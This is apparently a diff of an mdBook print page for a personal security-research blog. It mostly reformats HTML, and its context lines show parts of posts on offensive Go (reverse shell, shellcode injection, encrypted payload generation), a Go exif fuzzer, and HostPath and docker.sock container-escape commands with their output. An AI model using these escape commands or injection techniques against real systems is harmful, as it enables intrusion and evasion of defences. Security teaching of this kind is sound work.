@@ -3,50 +3,29 @@
     <head>
         <!-- Book generated using mdBook -->
         <meta charset="UTF-8">
-        <title>Jan0ski's Security Blog</title>
-        
+        <title>Jan0ski&#x27;s Security Blog</title>
         <meta name="robots" content="noindex" />
-        
-        
-
-
         <!-- Custom HTML head -->
-        
-
-
         <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
         <meta name="description" content="">
         <meta name="viewport" content="width=device-width, initial-scale=1">
         <meta name="theme-color" content="#ffffff" />
 
-        
         <link rel="icon" href="favicon.svg">
-        
-        
         <link rel="shortcut icon" href="favicon.png">
-        
         <link rel="stylesheet" href="css/variables.css">
         <link rel="stylesheet" href="css/general.css">
         <link rel="stylesheet" href="css/chrome.css">
-        
         <link rel="stylesheet" href="css/print.css" media="print">
-        
-
         <!-- Fonts -->
         <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
-        
         <link rel="stylesheet" href="fonts/fonts.css">
-        
-
         <!-- Highlight.js Stylesheets -->
         <link rel="stylesheet" href="highlight.css">
         <link rel="stylesheet" href="tomorrow-night.css">
         <link rel="stylesheet" href="ayu-highlight.css">
 
         <!-- Custom theme stylesheets -->
-        
-
-        
     </head>
     <body>
         <!-- Provide site root to javascript -->
@@ -105,7 +84,6 @@
         <div id="page-wrapper" class="page-wrapper">
 
             <div class="page">
-                
                 <div id="menu-bar-hover-placeholder"></div>
                 <div id="menu-bar" class="menu-bar sticky bordered">
                     <div class="left-buttons">
@@ -122,33 +100,26 @@
                             <li role="none"><button role="menuitem" class="theme" id="navy">Navy (default)</button></li>
                             <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                         </ul>
-                        
                         <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                             <i class="fa fa-search"></i>
                         </button>
-                        
                     </div>
 
-                    <h1 class="menu-title">Jan0ski's Security Blog</h1>
+                    <h1 class="menu-title">Jan0ski&#x27;s Security Blog</h1>
 
                     <div class="right-buttons">
-                        
                         <a href="print.html" title="Print this book" aria-label="Print this book">
                             <i id="print-button" class="fa fa-print"></i>
                         </a>
-                        
-                        
                         <a href="https://github.com/jan0ski/jan0ski.github.io" title="Git repository" aria-label="Git repository">
                             <i id="git-repository-button" class="fa fa-github"></i>
                         </a>
-                        
                     </div>
                 </div>
 
-                
                 <div id="search-wrapper" class="hidden">
                     <form id="searchbar-outer" class="searchbar-outer">
-                        <input type="search" name="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                     </form>
                     <div id="searchresults-outer" class="searchresults-outer hidden">
                         <div id="searchresults-header" class="searchresults-header"></div>
@@ -156,8 +127,6 @@
                         </ul>
                     </div>
                 </div>
-                
-
                 <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                 <script type="text/javascript">
                     document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
@@ -169,27 +138,27 @@
 
                 <div id="content" class="content">
                     <main>
-                        <h2><a class="header" href="#a-page-to-compile-my-journey-through-various-experiments-in-security-research-and-programming" id="a-page-to-compile-my-journey-through-various-experiments-in-security-research-and-programming">A page to compile my journey through various experiments in security research and programming.</a></h2>
-<h3><a class="header" href="#i-classfa-fa-twitteria-hrefhttpstwittercomjan0ski_-jan0ski_a--i-classfa-fa-githubia-hrefhttpsgithubcomjan0ski-jan0skia" id="i-classfa-fa-twitteria-hrefhttpstwittercomjan0ski_-jan0ski_a--i-classfa-fa-githubia-hrefhttpsgithubcomjan0ski-jan0skia"><i class="fa fa-twitter"></i><a href="https://twitter.com/jan0ski_"> @jan0ski_</a> | <i class="fa fa-github"></i><a href="https://github.com/jan0ski/"> jan0ski</a></a></h3>
+                        <h2 id="a-page-to-compile-my-journey-through-various-experiments-in-security-research-and-programming"><a class="header" href="#a-page-to-compile-my-journey-through-various-experiments-in-security-research-and-programming">A page to compile my journey through various experiments in security research and programming.</a></h2>
+<h3 id="jan0ski_---jan0ski"><a class="header" href="#jan0ski_---jan0ski"><i class="fa fa-twitter"></i><a href="https://twitter.com/jan0ski_"> @jan0ski_</a> | <i class="fa fa-github"></i><a href="https://github.com/jan0ski/"> jan0ski</a></a></h3>
 <hr />
-<h2><a class="header" href="#-ls-" id="-ls-"><code>$ ls ./</code></a></h2>
+<h2 id="-ls-"><a class="header" href="#-ls-"><code>$ ls ./</code></a></h2>
 <ul>
 <li><a href="./golang/rev-shell.html">Offensive Go</a></li>
 <li><a href="./k8s/hostpath.html">Containers &amp; Kubernetes</a></li>
 <li><a href="">CTF Write-ups</a></li>
 </ul>
-<h1><a class="header" href="#offensive-go" id="offensive-go">Offensive Go</a></h1>
-<h2><a class="header" href="#code" id="code">Code</a></h2>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="offensive-go"><a class="header" href="#offensive-go">Offensive Go</a></h1>
+<h2 id="code"><a class="header" href="#code">Code</a></h2>
 <ul>
 <li><a href="golang/./rev-shell.html">Reverse Shell</a></li>
 <li><a href="golang/./code-injection.html">Local Shellcode Injection</a></li>
 <li><a href="golang/./encrypted-generator.html">Encrypted Payload Generator</a></li>
 </ul>
-<h2><a class="header" href="#fuzzing" id="fuzzing">Fuzzing</a></h2>
+<h2 id="fuzzing"><a class="header" href="#fuzzing">Fuzzing</a></h2>
 <ul>
 <li><a href="golang/./exif-fuzz.html">Exif Parser Fuzzing</a></li>
 </ul>
-<h1><a class="header" href="#reverse-shell" id="reverse-shell">Reverse Shell</a></h1>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="reverse-shell"><a class="header" href="#reverse-shell">Reverse Shell</a></h1>
 <blockquote>
 <p><i class="fa fa-info-circle fa-lg"></i>
 To create a binary for a specific operating system or architecture, set the <code>GOOS</code> and <code>GOARCH</code> environment variables before running the <code>go build</code> command.<br/><br/>
@@ -229,10 +198,10 @@ func main() {
 	cmd.Run()
 }
 </code></pre>
-<h1><a class="header" href="#code-injection" id="code-injection">Code Injection</a></h1>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="code-injection"><a class="header" href="#code-injection">Code Injection</a></h1>
 <p>Example of injecting shellcode into a local process.</p>
 <hr />
-<h2><a class="header" href="#calling-the-windows-api" id="calling-the-windows-api">Calling the Windows API</a></h2>
+<h2 id="calling-the-windows-api"><a class="header" href="#calling-the-windows-api">Calling the Windows API</a></h2>
 <p>To call the Windows API in Go, we need to use the <code>syscall</code> library to load <code>kernel32.dll</code> and create references to the functions we need to use. Additionally, we'll create some constants reflecting those that exist in the Windows API.</p>
 <p>For shellcode injection, the <code>VirtualAlloc</code> Windows function is used to allocate memory in our process to store the payload.</p>
 <pre><code class="language-go">const (
@@ -248,7 +217,7 @@ var (
 )
 </code></pre>
 <hr />
-<h2><a class="header" href="#allocating-memory-and-calling-virtualalloc" id="allocating-memory-and-calling-virtualalloc">Allocating memory and calling VirtualAlloc</a></h2>
+<h2 id="allocating-memory-and-calling-virtualalloc"><a class="header" href="#allocating-memory-and-calling-virtualalloc">Allocating memory and calling VirtualAlloc</a></h2>
 <p>Referencing documentation for the <code>VirtualAlloc</code> function in the C++ Windows API, we set our parameters to the <code>Call</code> function similarly in Go:</p>
 <p>C++</p>
 <pre><code class="language-c++">LPVOID VirtualAlloc(
@@ -282,16 +251,16 @@ After the payload is copied in, we can execute it with <code>syscall.Syscall()</
 <p><img src="golang/../images/reverse_shell.png" alt="Reverse Shell" /></p>
 <p align=center>Catching the reverse shell launched via injected shellcode payload.</p>
 <hr />
-<h2><a class="header" href="#references" id="references">References</a></h2>
+<h2 id="references"><a class="header" href="#references">References</a></h2>
 <ul>
 <li><a href="https://ired.team/offensive-security/code-injection-process-injection/process-injection">CreateRemoteThread Shellcode Injection</a></li>
 <li><a href="https://medium.com/jettech/breaking-all-the-rules-using-go-to-call-windows-api-2cbfd8c79724">Using Go to Call the Windows API</a></li>
 <li><a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc?redirectedfrom=MSDN">VirtualAlloc function - Win32 apps</a></li>
 </ul>
-<h1><a class="header" href="#encrypted-shellcode-injection" id="encrypted-shellcode-injection">Encrypted Shellcode Injection</a></h1>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="encrypted-shellcode-injection"><a class="header" href="#encrypted-shellcode-injection">Encrypted Shellcode Injection</a></h1>
 <p>A tool to generate go source code to compile payloads utilizing encrypted shellcode injection. To be used with a template Go file to execute the encrypted shellcode.</p>
 <hr />
-<h2><a class="header" href="#encrypted-payload-generator" id="encrypted-payload-generator">Encrypted Payload Generator</a></h2>
+<h2 id="encrypted-payload-generator"><a class="header" href="#encrypted-payload-generator">Encrypted Payload Generator</a></h2>
 <ul>
 <li>Generate shellcode with msfvenom or other tools.</li>
 <li>Encrypt it using AES-256. </li>
@@ -363,7 +332,7 @@ func main() {
 	})
 }
 </code></pre>
-<h2><a class="header" href="#the-payload-template" id="the-payload-template">The Payload Template</a></h2>
+<h2 id="the-payload-template"><a class="header" href="#the-payload-template">The Payload Template</a></h2>
 <ul>
 <li>Used as a template Go file for the generator to include its encrypted shellcode and key.</li>
 <li>Decrypts shellcode with a given key and executes its memory via local code injection.</li>
@@ -427,14 +396,14 @@ func main() {
 }
 </code></pre>
 <hr />
-<h2><a class="header" href="#references-1" id="references-1">References</a></h2>
+<h2 id="references-1"><a class="header" href="#references-1">References</a></h2>
 <ul>
 <li><a href="https://github.com/tomsteele/pen-utils/blob/master/go-encrypt-shellcode-thing/main.go">tomsteele/penutils</a></li>
 </ul>
-<h1><a class="header" href="#exif-parser-fuzzing" id="exif-parser-fuzzing">Exif Parser Fuzzing</a></h1>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="exif-parser-fuzzing"><a class="header" href="#exif-parser-fuzzing">Exif Parser Fuzzing</a></h1>
 <p>Writing a custom fuzzer for an exif parser using Go.</p>
 <hr />
-<h2><a class="header" href="#easy-fuzzing-target" id="easy-fuzzing-target">Easy Fuzzing Target</a></h2>
+<h2 id="easy-fuzzing-target"><a class="header" href="#easy-fuzzing-target">Easy Fuzzing Target</a></h2>
 <p>A light google search of common fuzzing targets implemented in memory-unsafe languages such as C leads me to find <a href="https://github.com/mkttanabe/exif/">this</a> repo. It's a great, simple implementation of an exif parser and will work perfectly for our purposes.</p>
 <p>To test the output of the tool, compile the binary and run it on a sample jpg containing exif data. A great sample set can be found at https://github.com/ianare/exif-samples.</p>
 <pre><code>~/exifFuzz/exif $ make
@@ -448,7 +417,7 @@ func main() {
  - Orientation: 1
 ... snip ...
 </code></pre>
-<h2><a class="header" href="#designing-the-fuzzer" id="designing-the-fuzzer">Designing the Fuzzer</a></h2>
+<h2 id="designing-the-fuzzer"><a class="header" href="#designing-the-fuzzer">Designing the Fuzzer</a></h2>
 <p>Fuzzing in general is all about rapidly varying the inputs of an application. In this case, all the data we have to manipulate is the contents of our input file. Randomly chaning individual bytes or patterns in the input file is bound to produce some unexpected results. This means our fuzzer will need to perform the following actions:</p>
 <ul>
 <li>Read in the bytes of a file.</li>
@@ -460,7 +429,7 @@ func main() {
 <li>Repeat many many times.</li>
 </ul>
 <hr />
-<h2><a class="header" href="#file-operations" id="file-operations">File Operations</a></h2>
+<h2 id="file-operations"><a class="header" href="#file-operations">File Operations</a></h2>
 <p>To manipulate the bytes of an input file, we use the <code>ioutil</code> package. We'll create two functions, <code>getBytes</code> and <code>createNew</code> that we will use to read the input file into a slice of bytes and then create a new file after we've mutated them. We can also include a small function, check that we use to check error values.</p>
 <p>These helper functions are done simply:</p>
 <pre><code class="language-go">// Check and panic on error
@@ -483,8 +452,8 @@ func createNew(data []byte) {
     check(err)
 }
 </code></pre>
-<h2><a class="header" href="#input-file-mutation" id="input-file-mutation">Input File Mutation</a></h2>
-<h3><a class="header" href="#the-bit-flip" id="the-bit-flip">The Bit Flip</a></h3>
+<h2 id="input-file-mutation"><a class="header" href="#input-file-mutation">Input File Mutation</a></h2>
+<h3 id="the-bit-flip"><a class="header" href="#the-bit-flip">The Bit Flip</a></h3>
 <p>An easy way to change input data is a simple bit flip. To implement this, I decided I would randomly select a percentage of the bytes in the file, and of that subset I'd change a byte randomly. This is slightly different than changing a singular bit randomly throughout the file, however I felt it achieved generally the same effect.</p>
 <p>To begin we'll need to select bytes at random, keeping track of their indexes in the input byte slice. We subtract 4 bytes off of the the file length to account for the <code>FF D8 FF DB</code> jpg file header.</p>
 <pre><code class="language-go">var byteIndexes []int
@@ -505,7 +474,7 @@ fmt.Println(&quot;Indexes chosen: &quot;, byteIndexes)
     }
     return data
 </code></pre>
-<h3><a class="header" href="#getting-more-sophisticated---magic-numbers" id="getting-more-sophisticated---magic-numbers">Getting More Sophisticated - Magic Numbers</a></h3>
+<h3 id="getting-more-sophisticated---magic-numbers"><a class="header" href="#getting-more-sophisticated---magic-numbers">Getting More Sophisticated - Magic Numbers</a></h3>
 <p>Since I generally don't know what I'm doing, I tend to read many blogs and watch technology streams to discover techniques in areas that I'm unfamiliar with - like Fuzzing! <a href="https://twitter.com/gynvael">Gynvael's YouTube channel</a> has loads of resources on fuzzing and is a great resource for learning more. In his intro to fuzzing stream, he mentions &quot;Magic Numbers&quot; in files that are ripe for manipulation.</p>
 <p>The numbers are chosen based on the propensity for errors like integer underflow or overflow to result from changing their values.</p>
 <ul>
@@ -594,7 +563,7 @@ index := rand.Intn(len(data) - 8)
     return data
 }
 </code></pre>
-<h2><a class="header" href="#randomize-mutations" id="randomize-mutations">Randomize Mutations</a></h2>
+<h2 id="randomize-mutations"><a class="header" href="#randomize-mutations">Randomize Mutations</a></h2>
 <p>To round out our mutation routines, and because our bit flipper isn't entirely obsolete (or at least I like to think it isn't), we can create one last wrapper function for mutating data. This wrapper will randomize our choice of mutator between the <code>mutateMagic</code> and <code>mutateBits</code> techniques.</p>
 <pre><code class="language-go">// Select mutator at random to mutate `data`
 func mutate(data []byte) []byte {
@@ -603,7 +572,7 @@ func mutate(data []byte) []byte {
 }
 </code></pre>
 <hr />
-<h2><a class="header" href="#writing-the-fuzzing-harness" id="writing-the-fuzzing-harness">Writing the Fuzzing Harness</a></h2>
+<h2 id="writing-the-fuzzing-harness"><a class="header" href="#writing-the-fuzzing-harness">Writing the Fuzzing Harness</a></h2>
 <p>Now for the real meat of the fuzzer. We need to feed the program our mutated file, and keep track of inputs that cause significant crashes. A significant crash in this case would be writing to memory outside of the range of the program, or a segmentation fault.</p>
 <p>To easily capture the error output of a faulting instance of <code>exif</code>, we wrap the command in a <code>bash -c</code> command, and execute it with Go using the <code>os/exec</code> package. We then direct the <code>stderr</code> from the command to our buffer to analyze the output.</p>
 <pre><code class="language-go">// Run command, capture output
@@ -633,7 +602,7 @@ if counter%100 == 0 {
     fmt.Println(counter)
 }
 </code></pre>
-<h2><a class="header" href="#putting-it-all-together" id="putting-it-all-together">Putting it all Together</a></h2>
+<h2 id="putting-it-all-together"><a class="header" href="#putting-it-all-together">Putting it all Together</a></h2>
 <p>Now we're ready to create the main execution flow of our fuzzing routine. Looking back at what we set out to do, we see where each piece fits in:</p>
 <ul>
 <li>Read in the bytes of a file. ✔ <code>getBytes</code></li>
@@ -674,26 +643,26 @@ if counter%100 == 0 {
 <pre><code>~/exifFuzz $ ./exif/bin/exif crashes/crash.2436.jpg
 Segmentation fault
 </code></pre>
-<h2><a class="header" href="#conclusion" id="conclusion">Conclusion</a></h2>
+<h2 id="conclusion"><a class="header" href="#conclusion">Conclusion</a></h2>
 <p>My experience with Go is that it is an extremely versatile and easy to learn language, with powerful low-level capabilities. Finding tools and solutions in one language and implementing them in Go is rather straightforward, and a great way to learn more, no what matter the source language is. This is a great example of a highly-documented use case that is a great exercise for learning a new language. This fuzzer can definitely be improved upon with <a href="https://tour.golang.org/concurrency/1">goroutines</a> for concurrency among many other optimizations for performance. We'll see what we can do in the future to implement concurrency into our fuzzer, or possibly implement it again in a more performant type-safe language such as Rust. Additionally, we could go down the route of exploitation, and explore ways of identifying vulnerabilities brought to light by our fuzzer.</p>
 <p>The full source of this lab can be found on my <a href="https://github.com/jan0ski/exifFuzz">Github</a>. It includes everything needed for the steps covered here (including a version for the win32 binary!).</p>
 <hr />
-<h2><a class="header" href="#references-2" id="references-2">References</a></h2>
+<h2 id="references-2"><a class="header" href="#references-2">References</a></h2>
 <ul>
 <li><a href="https://h0mbre.github.io/Fuzzing-Like-A-Caveman/#">h0mbre - Fuzzing Like A Caveman</a></li>
 <li><a href="https://github.com/jaybosamiya/security-notes#basics-of-fuzzing">jaybosamiya - Security Notes</a></li>
 <li><a href="https://www.youtube.com/channel/UCCkVMojdBWS-JtH7TliWkVg">Gynvael's Youtube Channel</a></li>
 </ul>
-<h1><a class="header" href="#containers--kubernetes" id="containers--kubernetes">Containers &amp; Kubernetes</a></h1>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="containers--kubernetes"><a class="header" href="#containers--kubernetes">Containers &amp; Kubernetes</a></h1>
 <ul>
 <li><a href="k8s/./hostpath.html">HostPath</a></li>
 <li><a href="k8s/./kubesec-sdk.html">Attacking Kube_Security_Lab w/ Client-go</a></li>
 </ul>
-<h1><a class="header" href="#hostpath" id="hostpath">HostPath</a></h1>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="hostpath"><a class="header" href="#hostpath">HostPath</a></h1>
 <p>Abusing HostPath to escape containers.</p>
 <hr />
-<h2><a class="header" href="#mounting-root-volumes-inside-containers" id="mounting-root-volumes-inside-containers">Mounting Root Volumes Inside Containers</a></h2>
-<h3><a class="header" href="#docker" id="docker">Docker</a></h3>
+<h2 id="mounting-root-volumes-inside-containers"><a class="header" href="#mounting-root-volumes-inside-containers">Mounting Root Volumes Inside Containers</a></h2>
+<h3 id="docker"><a class="header" href="#docker">Docker</a></h3>
 <p>Run an alpine container with root filesystem mounted under <code>/host</code> in the container</p>
 <pre><code>$ docker run --rm -it -v /:/host alpine:latest /bin/sh
 $ / # cat /etc/os-release
@@ -737,7 +706,7 @@ tmpfs            13G     0   13G   0% /mnt/wsl
 C:\             1.8T  1.7T  131G  93% /mnt/c
 D:\             112G   11G  102G  10% /mnt/d
 </code></pre>
-<h3><a class="header" href="#kubernetes" id="kubernetes">Kubernetes</a></h3>
+<h3 id="kubernetes"><a class="header" href="#kubernetes">Kubernetes</a></h3>
 <pre><code class="language-yaml">apiVersion: v1
 kind: Pod
 metadata:
@@ -774,7 +743,7 @@ PLATFORM_ID=&quot;platform:f33&quot;
 PRETTY_NAME=&quot;Fedora CoreOS 33.20210104.3.1&quot;
 ...&lt;snip&gt;...
 </code></pre>
-<h3><a class="header" href="#docker-socket" id="docker-socket">Docker Socket</a></h3>
+<h3 id="docker-socket"><a class="header" href="#docker-socket">Docker Socket</a></h3>
 <p>The docker socker on the host is located at <code>/var/run/docker.sock</code>. Mounting this inside a container will allow processes running inside the container to interact with the docker daemon, and run additional containers.</p>
 <pre><code>$ docker run --rm -it -v /var/run/docker.sock:/var/run/docker.sock docker /bin/sh
 / # docker version
@@ -794,7 +763,7 @@ Client: Docker Engine - Community
 CONTAINER ID   IMAGE     COMMAND                  CREATED              STATUS              PORTS     NAMES
 e52efd14f85c   docker    &quot;docker-entrypoint.s…&quot;   About a minute ago   Up About a minute             dreamy_poincare
 </code></pre>
-<h3><a class="header" href="#privileged-containers" id="privileged-containers">Privileged Containers</a></h3>
+<h3 id="privileged-containers"><a class="header" href="#privileged-containers">Privileged Containers</a></h3>
 <p>Although we have complete access to the hosts filesystem, we still lack some capabilities we'd want to completely bypass all restrictions of the container and get true <code>root</code>.</p>
 <p>Use <code>capsh</code> to show some capabilities are missing, such as <code>cap_sys_admin</code>, the biggest bundle of privileges.</p>
 <pre><code>root@3396f9188944:/# capsh --print
@@ -814,73 +783,45 @@ Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fset
 ...
 </code></pre>
 <hr />
-<h2><a class="header" href="#references-3" id="references-3">References</a></h2>
+<h2 id="references-3"><a class="header" href="#references-3">References</a></h2>
 <ul>
 <li><a href="https://linux-audit.com/linux-capabilities-101/">Linux Capabilities</a></li>
 <li><a href="https://www.youtube.com/watch?v=HmoVSmTIOxM">The Path Less Traveled: Abusing K8s Defaults - Ian Coldwater &amp; Duffy Cooley</a></li>
 <li><a href="https://www.youtube.com/watch?v=OPuu8wsu2Zc">Seccomp Security Profiles and You - Duffy Cooley</a></li>
 <li><a href="https://github.com/madhuakula/kubernetes-goat">Kubernetes Goat - Intentional Vulnerable K8s Cluster</a></li>
 </ul>
-<h1><a class="header" href="#kube_security_lab-w-client-go" id="kube_security_lab-w-client-go">Kube_Security_Lab w/ Client-go</a></h1>
-<h1><a class="header" href="#ctf-write-ups" id="ctf-write-ups">CTF Write-ups</a></h1>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="kube_security_lab-w-client-go"><a class="header" href="#kube_security_lab-w-client-go">Kube_Security_Lab w/ Client-go</a></h1>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="ctf-write-ups"><a class="header" href="#ctf-write-ups">CTF Write-ups</a></h1>
 
                     </main>
 
                     <nav class="nav-wrapper" aria-label="Page navigation">
                         <!-- Mobile navigation buttons -->
-                        
-
-                        
-
                         <div style="clear: both"></div>
                     </nav>
                 </div>
             </div>
 
             <nav class="nav-wide-wrapper" aria-label="Page navigation">
-                
-
-                
             </nav>
 
         </div>
 
-        
-
-        
-
-        
-
-        
         <script type="text/javascript">
             window.playground_copyable = true;
         </script>
-        
-
-        
-
-        
         <script src="elasticlunr.min.js" type="text/javascript" charset="utf-8"></script>
         <script src="mark.min.js" type="text/javascript" charset="utf-8"></script>
         <script src="searcher.js" type="text/javascript" charset="utf-8"></script>
-        
-
         <script src="clipboard.min.js" type="text/javascript" charset="utf-8"></script>
         <script src="highlight.js" type="text/javascript" charset="utf-8"></script>
         <script src="book.js" type="text/javascript" charset="utf-8"></script>
 
         <!-- Custom JS scripts -->
-        
-
-        
-        
         <script type="text/javascript">
         window.addEventListener('load', function() {
             window.setTimeout(window.print, 100);
         });
         </script>
-        
-        
-
     </body>
 </html>
